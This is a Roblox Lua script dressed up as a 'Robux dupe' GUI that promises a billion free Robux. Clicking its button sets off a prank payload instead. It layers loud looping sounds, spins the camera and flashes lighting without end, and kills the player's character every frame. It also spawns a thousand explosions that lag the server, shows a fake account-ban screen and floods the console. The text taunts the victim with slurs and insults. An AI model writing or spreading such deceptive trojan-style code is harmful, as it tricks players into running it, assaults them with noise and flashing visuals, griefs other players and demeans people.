-- ULTIMATE ROBUX DUPE 2026 (WORST SHIT POSSIBLE U GON CRY) 😭💀🔥💔
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Parent = game.CoreGui
gui.Name = "RobuxDupeGodMode2026"

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.4,0,0.6,0)
frame.Position = UDim2.new(0.3,0,0.2,0)
frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
frame.BorderSizePixel = 5
frame.BorderColor3 = Color3.fromRGB(255,0,0)
frame.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0.15,0)
title.BackgroundColor3 = Color3.fromRGB(255,215,0)
title.Text = "ROBUX DUPE GOD MODE 2026\n+1,000,000,000 FREE ROBUX\nNO HUMAN VERIFICATION!"
title.TextColor3 = Color3.fromRGB(255,0,0)
title.Font = Enum.Font.Cartoon
title.TextSize = 40
title.TextStrokeTransparency = 0
title.TextStrokeColor3 = Color3.fromRGB(0,0,0)
title.Parent = frame

local fakeText = Instance.new("TextLabel")
fakeText.Size = UDim2.new(0.9,0,0.2,0)
fakeText.Position = UDim2.new(0.05,0,0.2,0)
fakeText.BackgroundTransparency = 1
fakeText.Text = "Server sync in progress...\nBypassing anti-cheat...\nRobux transfer 99%..."
fakeText.TextColor3 = Color3.fromRGB(0,255,0)
fakeText.Font = Enum.Font.Arcade
fakeText.TextSize = 30
fakeText.TextWrapped = true
fakeText.Parent = frame

local button = Instance.new("TextButton")
button.Size = UDim2.new(0.8,0,0.25,0)
button.Position = UDim2.new(0.1,0,0.5,0)
button.BackgroundColor3 = Color3.fromRGB(0,255,0)
button.BorderSizePixel = 6
button.BorderColor3 = Color3.fromRGB(255,255,0)
button.Text = "DUPE 1 BILLION ROBUX NOW!\nCLICK FAST BEFORE PATCHED"
button.TextColor3 = Color3.fromRGB(255,0,0)
button.Font = Enum.Font.Cartoon
button.TextSize = 45
button.TextWrapped = true
button.Parent = frame

local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1,0,0.1,0)
footer.Position = UDim2.new(0,0,0.9,0)
footer.BackgroundColor3 = Color3.fromRGB(0,0,255)
footer.Text = "1000000% LEGIT • NO BAN RISK • HAPPYMOD CERTIFIED"
footer.TextColor3 = Color3.fromRGB(255,255,0)
footer.Font = Enum.Font.Arcade
footer.TextSize = 28
footer.Parent = frame

-- the real apocalypse when u press
button.MouseButton1Click:Connect(function()
    fakeText.Text = "DUPE COMPLETE! CHECK YOUR BALANCE!\nCONGRATS YOU'RE RICH NOW 😈"
    button.Text = "THANKS FOR THE CLICK RETARD"
    button.BackgroundColor3 = Color3.fromRGB(255,0,0)
    
    -- 20 layered 67 phonk earrape at random speeds
    for i=1,20 do
        spawn(function()
            local s = Instance.new("Sound")
            s.SoundId = "rbxassetid://125476440612900"
            s.Volume = 10
            s.PlaybackSpeed = math.random(1,30)/10
            s.Looped = true
            s.Parent = player.PlayerGui
            s:Play()
            wait(math.random(1,5))
            s.Volume = 10 + math.random(0,5)
        end)
    end
    
    -- infinite screen spin + fov rape + color invert
    spawn(function()
        while true do
            workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame * CFrame.Angles(math.rad(math.random(-360,360)), math.rad(math.random(-360,360)), math.rad(math.random(-360,360)))
            workspace.CurrentCamera.FieldOfView = math.random(1,179)
            game.Lighting.Brightness = math.random(0,200)
            game.Lighting.ClockTime = math.random()
            game.Lighting.ColorShift_Top = Color3.new(math.random(),math.random(),math.random())
            wait(0.01)
        end
    end)
    
    -- kill u every frame + teleport to void
    spawn(function()
        while true do
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid.Health = 0
                player.Character.HumanoidRootPart.CFrame = CFrame.new(0,999999999,0) * CFrame.Angles(0,math.rad(math.random(0,360)),0)
            end
            wait()
        end
    end)
    
    -- spawn 1000 exploding parts that lag everyone
    spawn(function()
        for i=1,1000 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(10,10,10)
            p.Position = player.Character and player.Character.HumanoidRootPart.Position or Vector3.new(0,100,0)
            p.Color = Color3.new(math.random(),math.random(),math.random())
            p.Transparency = 0.5
            p.Anchored = false
            p.CanCollide = false
            p.Parent = workspace
            local exp = Instance.new("Explosion")
            exp.BlastRadius = 50
            exp.BlastPressure = 500000
            exp.Position = p.Position
            exp.Parent = workspace
            wait(0.02)
        end
    end)
    
    -- fake ban screen that covers everything
    local ban = Instance.new("Frame")
    ban.Size = UDim2.new(1,0,1,0)
    ban.BackgroundColor3 = Color3.fromRGB(0,0,0)
    ban.ZIndex = 999999
    ban.Parent = gui
    
    local banTxt = Instance.new("TextLabel")
    banTxt.Size = UDim2.new(1,0,1,0)
    banTxt.BackgroundTransparency = 1
    banTxt.Text = "ACCOUNT TERMINATED\nREASON: EXPLOITING + MASS REPORTS\nROBUX REVERTED TO 0\nHAVE FUN IN HELL RETARD 💀"
    banTxt.TextColor3 = Color3.fromRGB(255,0,0)
    banTxt.Font = Enum.Font.Arcade
    banTxt.TextSize = 80
    banTxt.TextWrapped = true
    banTxt.Parent = ban
    
    -- spam console with bullshit
    for i=1,100 do
        print("ERROR: CRITICAL EXPLOIT DETECTED - "..math.random(1000000,9999999).." ROBUX REVERTED")
    end
end)

print("worst dupe robux gui in existence loaded u dumb hoe 😭💔")
print("press the green button and prepare to uninstall + cry in corner fatty")
